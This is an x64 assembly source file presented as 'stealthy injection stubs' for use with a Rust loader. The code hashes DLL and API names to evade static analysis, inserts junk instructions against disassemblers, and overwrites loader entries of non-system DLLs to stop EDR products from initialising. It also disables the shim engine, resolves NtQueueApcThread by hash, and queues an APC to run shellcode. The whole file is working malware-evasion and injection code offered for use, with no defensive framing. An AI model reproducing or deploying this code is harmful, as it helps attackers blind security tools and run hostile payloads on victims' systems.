; Stealthy Injection Stubs. 
; nasm.exe -f bin .\stub.asm -o stub.bin
; For x64 version only 
; Author: @5mukx

[BITS 64]

evasion_start:
    ; -------------------------------------------------------------------------
    ; Prologue & Context Saving
    ; -------------------------------------------------------------------------
    push rbp                  ; Save Base Pointer (and used for stack alignment/obfuscation later)
    push rsi                  ; Save Source Index (callee-saved register)
    push rdi                  ; Save Destination Index (callee-saved register)

    ; -------------------------------------------------------------------------
    ; PEB Access (Process Environment Block)
    ; -------------------------------------------------------------------------
    mov  rdx, qword gs:[60h]  ; Access PEB structure directly via GS segment register
    mov  rdx, qword [rdx+18h] ; PEB->Ldr (PEB_LDR_DATA) - contains info about loaded modules
    lea  rdx, qword [rdx+20h] ; Ldr->InMemoryOrderModuleList (List head)
    push rdx                  ; Save the list head to stack to detect when loop finishes
    mov  rdx, qword [rdx]     ; Dereference to get the first entry (current executable)

    ; -------------------------------------------------------------------------
    ; DLL Enumeration Loop
    ; Walks the linked list of loaded modules to identify targets.
    ; -------------------------------------------------------------------------
dll_loop:
    mov rdx, qword [rdx]      ; Move to next entry (InMemoryOrderLinks.Flink)
    cmp rdx, qword [rsp]      ; Compare current pointer with list head (saved on stack)
    je  loop_end              ; If equal, we have looped through all DLLs. Finish.
    
    ; Obfuscation / Junk Code
    inc rbp                   ; Increment RBP (No logical purpose)
    dec rbp                   ; Decrement RBP (Restore it immediately)
    jz  dummy_jump            ; Conditional jump that serves to break linear disassembly

dummy_jump:
    ; -------------------------------------------------------------------------
    ; String Normalization
    ; Reads the DLL name (UNICODE), converts to ASCII, and creates a local copy.
    ; -------------------------------------------------------------------------
    mov   rsi, qword [rdx+50h]    ; LDR_DATA_TABLE_ENTRY->BaseDllName.Buffer (Pointer to string)
    movzx rcx, word [rdx+48h]     ; LDR_DATA_TABLE_ENTRY->BaseDllName.Length (Size in bytes)
    shr   rcx, 1                  ; Divide by 2 (convert bytes to character count for WideChar)
    add   rcx, 8h                 ; Add padding bytes + space for Null Terminator
    and   rcx, 0FFFFFFFFFFFFFFF0h ; Align size to 16 bytes (Stack alignment requirement)
    sub   rsp, rcx                ; Dynamically allocate space on the stack for the string
    mov   r10, rcx                ; Save the allocated size in r10 for cleanup later
    xor   rcx, rcx                ; Reset counter

convert_loop:
    xor   rax, rax
    lodsw                     ; Load Word (2 bytes) from [RSI] into AX (One WCHAR)
    test  al,  al             ; Check for null terminator
    jz    hash_dll            ; If end of string, proceed to hashing

    ; -------------------------------------------------------------------------
    ; Obfuscation / Junk Block
    ; Designed to confuse heuristics or emulators looking for tight loops.
    ; -------------------------------------------------------------------------
    test rax, 0x5678          ; Pointless comparison
    nop                       ; No Operation
    
    ; Lowercase Conversion Logic
    cmp  al,  'A'
    jb   save_char            ; If below 'A', it's not an uppercase letter
    cmp  al,  'Z'
    ja   save_char            ; If above 'Z', it's not an uppercase letter
    add  al,  32              ; Convert Uppercase to Lowercase

save_char:
    mov byte [rsp+rcx], al    ; Store the ASCII byte onto our stack buffer
    inc rcx                   ; Increment index
    jmp convert_loop          ; Next character

    ; -------------------------------------------------------------------------
    ; DLL Identification
    ; Hashes the normalized string and checks if it's a critical system DLL.
    ; -------------------------------------------------------------------------
hash_dll:
    mov  byte [rsp+rcx], 0              ; Null-terminate the stack string
    mov  rsi,            rsp            ; RSI points to our stack string
    call hash_str                       ; Calculate hash (Result in RDI)
    add  rsp,            r10            ; Clean up stack (release the string buffer)
    
    ; Check against whitelist because system DLLs we do NOT want to touch
    mov  rsi,            321925C40F3FF70Ah  ; Hash for "ntdll.dll"
    cmp  rsi,            rdi
    je   dll_loop                       ; Skip if ntdll
    
    mov  rsi,            4E54E981E6E28B2h   ; Hash for "kernel32.dll"
    cmp  rsi,            rdi
    je   dll_loop                       ; Skip if kernel32
    
    mov  rsi,            0C2227BAEE55DEA2Dh ; Hash for "kernelbase.dll"
    cmp  rsi,            rdi
    je   dll_loop                       ; Skip if kernelbase
    
    ; -------------------------------------------------------------------------
    ; EDR Preemption / Clobbering
    ; If we are here, the DLL is unknown (likely EDR). We try to disable it.
    ; -------------------------------------------------------------------------
    call disrupt_routine      ; Call the routine to overwrite loader data
    jmp  zero_return          ; Exit stub (logic flow break)

disrupt_routine:
    pop rax                   ; Get current instruction pointer (via ret addr pushed by call)
    ; LDR_DATA_TABLE_ENTRY Modification:
    ; Overwriting offset +28h. In many windows versions, this is EntryPoint or DllBase.
    ; By pointing this to junk (or a ret), we prevent the DLL from initializing correctly.
    mov qword [rdx+28h], rax  
    
    ; Junk Code
    xor rbp, rbp
    jmp dll_loop              ; Continue scanning other DLLs

    ; -------------------------------------------------------------------------
    ; Injection Phase
    ; Executed once all DLLs have been scanned/clobbered.
    ; -------------------------------------------------------------------------
loop_end:
    pop rdx                   ; Restore list head (cleanup stack)
    
    ; Shim Engine Cleanup
    mov rax,             1111111111111111h ; PLACEHOLDER: Address of g_ShimsEnabled
                                           ; Our Rust loader will patch this address at runtime.
    mov byte [rax],      0h                ; Set g_ShimsEnabled = 0 (Disable shims)

    ; -------------------------------------------------------------------------
    ; PE Parsing (ntdll.dll)
    ; Finding the base of ntdll to resolve exports manually.
    ; -------------------------------------------------------------------------
    mov rdx,             qword [rdx]       ; (Assuming RDX still points to list, traversing back)
    mov rdx,             qword [rdx]
    mov rdx,             qword [rdx+20h]   ; Get DllBase of ntdll.dll from Ldr entry
    
    xor rax,             rax
    mov eax,             dword [rdx+3Ch]   ; Get e_lfanew (Offset to PE Header)
    add rax,             rdx               ; RAX = PE Header address
    cmp word [rax+0x18], 020Bh             ; Magic Check (0x20B = PE32+ / 64-bit)
    jne end_routine                        ; Abort if not 64-bit
    
    ; Access Export Directory
    mov  eax,  dword [rax+88h]             ; RVA of Export Directory (OptionalHeader + 0x88)
    add  rax,  rdx                         ; RAX = Export Directory VA
    push rax                               ; Save Export Directory Address
    
    xor  r11,  r11
    mov  r11d, dword [rax+20h]             ; RVA of AddressOfNames
    add  r11,  rdx                         ; VA of AddressOfNames
    
    xor  rcx,  rcx
    mov  ecx,  dword [rax+18h]             ; NumberOfNames
    push rcx                               ; Save counter

    ; -------------------------------------------------------------------------
    ; API Resolution Loop
    ; Scans ntdll exports for "NtQueueApcThread"
    ; -------------------------------------------------------------------------
api_hunt:
    test rcx,  rcx
    jz   api_fail                      ; If counter hits 0, API not found
    
    xor  rsi,  rsi
    mov  esi,  dword [r11]             ; Get RVA of function name string
    add  rsi,  rdx                     ; VA of function name string
    call hash_str                      ; Hash the name
    
    add  r11,  4h                      ; Move to next name RVA (4 bytes)
    dec  rcx                           ; Decrement counter
    
    mov  rsi,  5D9C96D1D3BF2DF9h       ; Expected Hash: NtQueueApcThread
    cmp  rsi,  rdi                     ; Compare calculated hash with expected
    jne  api_hunt                      ; Loop if not match

    ; API Found: Resolve Address
    pop  rax                           ; Restore NumberOfNames (used for index calc)
    inc  ecx                           ; Adjust index
    sub  eax,  ecx                     ; Calculate ordinal index
    xchg eax,  ecx                     ; Move index to ECX
    pop  rax                           ; Restore Export Directory Address
    
    mov  r11d, dword [rax+24h]         ; RVA of AddressOfNameOrdinals
    add  r11,  rdx
    mov  cx,   word [r11+rcx*2]        ; Get ordinal
    
    mov  r11d, dword [rax+1Ch]         ; RVA of AddressOfFunctions
    add  r11,  rdx
    mov  eax,  dword [r11+rcx*4]       ; Get function RVA
    add  rax,  rdx                     ; RAX = Function VA (NtQueueApcThread)
    jmp  inject_code

    ; -------------------------------------------------------------------------
    ; Payload Trigger
    ; Uses NtQueueApcThread to execute the shellcode
    ; -------------------------------------------------------------------------
apc_trigger:
    mov  rcx, -2   ; Handle: Current Thread (Pseudo-handle -2)
    pop  rdx       ; Routine: Pop the return address (caller of this func) as the APC routine
                   ; Note: This assumes 'inject_code' called this via 'call'.
    xor  r8,  r8   ; Argument1: NULL
    xor  r9,  r9   ; Argument2: NULL
    push r9        ; Stack alignment / shadow space / extra args
    push r9
    sub  rsp, 20h  ; Allocate shadow space for Windows x64 calling convention
    call rax       ; Call NtQueueApcThread
    add  rsp, 30h  ; Cleanup stack

end_routine:
    pop rdi
    pop rsi
    pop rbp        ; Restore context
    nop

zero_return:
    xor rax, rax   ; Return 0 (Success)
    ret

api_fail:
    pop rcx
    pop rax
    jmp end_routine

    ; -------------------------------------------------------------------------
    ; Hashing Function
    ; String hashing to hide API/DLL names from static analysis.
    ; -------------------------------------------------------------------------
hash_str:
    mov rdi, 1337h         ; Initial Seed (Magic Value)

hash_compute:
    xor rax, rax
    lodsb                  ; Load byte from [RSI]
    cmp al,  ah            ; Check for null terminator (AH is 0)
    je  hash_finish
    
    ; Hash 
    xor rax, 0x5A          ; XOR key
    rol rdi, 3             ; Rotate Left
    mov r8,  rdi           ; Save intermediate
    shl rdi, 6             ; Shift Left
    add rdi, r8            ; Combine
    add rdi, rax           ; Mix in the character
    jmp hash_compute

hash_finish:
    ret

inject_code:
    call apc_trigger       ; 'call' pushes RIP (next instruction) to stack.
                           ; This RIP is popped into RDX in 'apc_trigger' and used
                           ; as the APC target address.